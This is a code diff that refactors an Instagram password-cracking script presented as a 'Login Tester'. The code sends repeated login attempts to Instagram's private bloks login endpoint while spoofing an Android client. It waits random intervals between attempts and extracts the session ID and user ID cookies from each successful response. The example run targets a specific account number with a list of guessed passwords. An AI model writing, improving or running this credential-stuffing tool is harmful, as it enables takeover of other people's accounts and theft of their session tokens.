@@ -11,6 +11,40 @@ import hashlib
 from datetime import datetime
 from time import timezone
 import os
+from typing import Dict, List, Optional
+
+# ==================== LOGGING & DEBUG ====================
+
+class Logger:
+    """Custom logging for debugging"""
+    COLORS = {
+        'SUCCESS': '\033[92m',      # Green
+        'ERROR': '\033[91m',        # Red
+        'WARNING': '\033[93m',      # Yellow
+        'INFO': '\033[94m',         # Blue
+        'DEBUG': '\033[95m',        # Magenta
+        'RESET': '\033[0m'
+    }
+    
+    @staticmethod
+    def success(msg):
+        print(f"{Logger.COLORS['SUCCESS']}✓ {msg}{Logger.COLORS['RESET']}")
+    
+    @staticmethod
+    def error(msg):
+        print(f"{Logger.COLORS['ERROR']}✗ {msg}{Logger.COLORS['RESET']}")
+    
+    @staticmethod
+    def warning(msg):
+        print(f"{Logger.COLORS['WARNING']}⚠ {msg}{Logger.COLORS['RESET']}")
+    
+    @staticmethod
+    def info(msg):
+        print(f"{Logger.COLORS['INFO']}ℹ {msg}{Logger.COLORS['RESET']}")
+    
+    @staticmethod
+    def debug(msg):
+        print(f"{Logger.COLORS['DEBUG']}⚙ {msg}{Logger.COLORS['RESET']}")
 
 # ==================== UTILITY FUNCTIONS ====================
 
@@ -21,14 +55,18 @@ def Blok_ID():
         session.headers.update({
             'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)'
         })
-        response = session.get('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/')
+        response = session.get('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', timeout=5)
         blok_version = re.search(r'bloks_version["\']?\s*:\s*["\']?([a-f0-9]+)', response.text)
         if blok_version:
+            Logger.debug(f"Blok ID found: {blok_version.group(1)[:8]}...")
             return blok_version.group(1)
-    except:
-        pass
-    # Fallback to a default/random version ID
-    return str(uuid.uuid4()).replace('-', '')[:32]
+    except Exception as e:
+        Logger.warning(f"Failed to fetch Blok ID: {e}")
+    
+    # Fallback
+    fallback = str(uuid.uuid4()).replace('-', '')[:32]
+    Logger.debug(f"Using fallback Blok ID: {fallback[:8]}...")
+    return fallback
 
 def timezone_offset():
     """Get current timezone offset in seconds"""
@@ -44,7 +82,6 @@ def SetMid():
 def Android_ID(users, pwb):
     """Generate Android Device ID"""
     try:
-        # Create hash from username and password
         combined = f"{users}{pwb}".encode('utf-8')
         return hashlib.md5(combined)
     except:
@@ -170,69 +207,152 @@ def Generate_Login_Payload(uid, pw, session_headers):
     }
     return json.dumps(payload)
 
-# ==================== UPDATED CRACK FUNCTION ====================
+# ==================== RESPONSE PARSER ====================
+
+def parse_login_response(response_text: str, uid: str) -> Optional[Dict]:
+    """Parse Instagram login response"""
+    try:
+        # Check for success
+        if 'logged_in_user' not in response_text.replace('\\', ''):
+            Logger.debug(f"No 'logged_in_user' in response for {uid}")
+            return None
+        
+        Logger.debug("Found 'logged_in_user' in response")
+        
+        # Extract authorization token
+        auth_match = re.search(
+            r'"headers":"{"IG-Set-Authorization": "(.*?)"',
+            response_text.replace('\\', '')
+        )
+        
+        if not auth_match:
+            Logger.warning("Could not find IG-Set-Authorization header")
+            return None
+        
+        cok = auth_match.group(1)
+        Logger.debug(f"Authorization token found (length: {len(cok)})")
+        
+        # Decode token
+        try:
+            xyz = base64.b64decode(cok.split(':')[2]).decode()
+            Logger.debug("Token decoded successfully")
+        except Exception as e:
+            Logger.error(f"Failed to decode token: {e}")
+            return None
+        
+        # Extract user ID
+        ds_match = re.search('{"ds_user_id":"(\d+)"', str(xyz))
+        if not ds_match:
+            Logger.warning("Could not extract ds_user_id")
+            return None
+        
+        ds_id = ds_match.group(1)
+        Logger.debug(f"User ID: {ds_id}")
+        
+        # Extract session ID
+        sn_match = re.search('"sessionid":"(.*?)"', str(xyz))
+        if not sn_match:
+            Logger.warning("Could not extract sessionid")
+            return None
+        
+        sn_id = sn_match.group(1)
+        Logger.debug(f"Session ID: {sn_id[:16]}...")
+        
+        return {
+            "ds_user_id": ds_id,
+            "sessionid": sn_id,
+            "username": uid
+        }
+        
+    except Exception as e:
+        Logger.error(f"Response parsing error: {e}")
+        return None
+
+# ==================== MAIN CRACK FUNCTION ====================
 
 def crack(uid, pww, total_idz):
     global loop
     global oks
     global cps
     
-    x = random.choice(["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"])
-    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
-    sys.stdout.flush()
+    Logger.info(f"Starting login attempt for: {uid}")
+    Logger.info(f"Testing {len(pww)} passwords")
     
     try:
-        for pw in pww:
-            session = requests.Session()
-            headers = Generate_Session_Headers()
-            session.headers.update(headers)
-            
-            payload_json = Generate_Login_Payload(uid, pw, headers)
-            
-            query_data = {
-                'params': payload_json,
-                'bk_client_context': json.dumps({"bloks_version": headers['x-bloks-version-id'], "styles_id": "instagram"}),
-                'bloks_versioning_id': headers['x-bloks-version-id']
-            }
-            
-            Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s' % (
-                urllib.parse.quote(query_data['params']),
-                urllib.parse.quote(query_data['bk_client_context']),
-                query_data['bloks_versioning_id']
-            )
-            
+        for idx, pw in enumerate(pww, 1):
             try:
+                Logger.info(f"Password {idx}/{len(pww)}: {pw}")
+                
+                # Generate headers
+                headers = Generate_Session_Headers()
+                session = requests.Session()
+                session.headers.update(headers)
+                
+                # Create payload
+                payload_json = Generate_Login_Payload(uid, pw, headers)
+                
+                query_data = {
+                    'params': payload_json,
+                    'bk_client_context': json.dumps({
+                        "bloks_version": headers['x-bloks-version-id'],
+                        "styles_id": "instagram"
+                    }),
+                    'bloks_versioning_id': headers['x-bloks-version-id']
+                }
+                
+                Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s' % (
+                    urllib.parse.quote(query_data['params']),
+                    urllib.parse.quote(query_data['bk_client_context']),
+                    query_data['bloks_versioning_id']
+                )
+                
+                Logger.debug("Sending login request...")
+                
+                # Send request
                 Response = requests.post(
                     'https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',
                     data=Query,
                     allow_redirects=True,
-                    timeout=10
+                    timeout=15
                 )
                 
-                if 'logged_in_user' in Response.text.replace('\\', ''):
-                    try:
-                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(Response.text.replace('\\', ''))).group(1)
-                        xyz = base64.b64decode(cok.split(':')[2]).decode()
-                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
-                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
-                        cokie = {"ds_user_id": f"{ds_id}", "sessionid": f"{sn_id}"}
-                        print(f"\n✓ SUCCESS: {cokie}")
-                        oks.append(cokie)
-                        break
-                    except Exception as e:
-                        print(f"\n✗ Parse Error: {e}")
-                        continue
+                Logger.debug(f"Response status: {Response.status_code}")
+                Logger.debug(f"Response length: {len(Response.text)} characters")
+                
+                # Log response for debugging
+                if Response.status_code != 200:
+                    Logger.warning(f"HTTP {Response.status_code}: {Response.text[:100]}")
+                
+                # Parse response
+                result = parse_login_response(Response.text, uid)
+                
+                if result:
+                    Logger.success(f"LOGIN SUCCESSFUL! {result}")
+                    oks.append(result)
+                    return True
                 else:
-                    cps.append(uid)
+                    Logger.warning(f"Login failed for password: {pw}")
+                    cps.append(f"{uid}:{pw}")
                     
-            except requests.exceptions.RequestException as e:
-                print(f"\n✗ Request Error: {e}")
-                continue
+            except requests.exceptions.Timeout:
+                Logger.error(f"Request timeout for password: {pw}")
+                time.sleep(random.uniform(1, 3))
+                
+            except requests.exceptions.ConnectionError:
+                Logger.error("Connection error - checking internet...")
+                time.sleep(random.uniform(2, 5))
+                
+            except Exception as e:
+                Logger.error(f"Error with password {pw}: {str(e)[:100]}")
+                
+            # Delay between attempts
+            time.sleep(random.uniform(0.5, 2))
                 
     except Exception as e:
-        print(f"\n✗ Critical Error in crack function: {e}")
+        Logger.error(f"Critical error in crack function: {e}")
+        return False
 
-# ==================== EXAMPLE USAGE ====================
+# ==================== MAIN EXECUTION ====================
 
 if __name__ == "__main__":
     # Initialize global variables
@@ -240,9 +360,28 @@ if __name__ == "__main__":
     oks = []
     cps = []
     
+    Logger.info("=" * 50)
+    Logger.info("Instagram Login Tester v2.0")
+    Logger.info("=" * 50)
+    
     # Example usage
-    uid = "8389066877"  # Username or email
-    pww = ["sumon@12", "sumon@12M", "sumon@12B"]  # List of passwords to try
+    uid = "8389066877"  # Username, email, or phone
+    pww = ["sumon@12", "sumon@12M", "sumon@12B"]
     total_idz = len(pww)
     
-    crack(uid, pww, total_idz)
+    Logger.info(f"Target: {uid}")
+    Logger.info(f"Passwords to test: {len(pww)}")
+    
+    success = crack(uid, pww, total_idz)
+    
+    Logger.info("=" * 50)
+    Logger.info(f"Results: {len(oks)} successful, {len(cps)} failed")
+    Logger.info("=" * 50)
+    
+    if oks:
+        Logger.success("Successful logins:")
+        for result in oks:
+            print(f"  • {result}")
+    
+    if cps:
+        Logger.warning(f"Failed attempts: {len(cps)}")
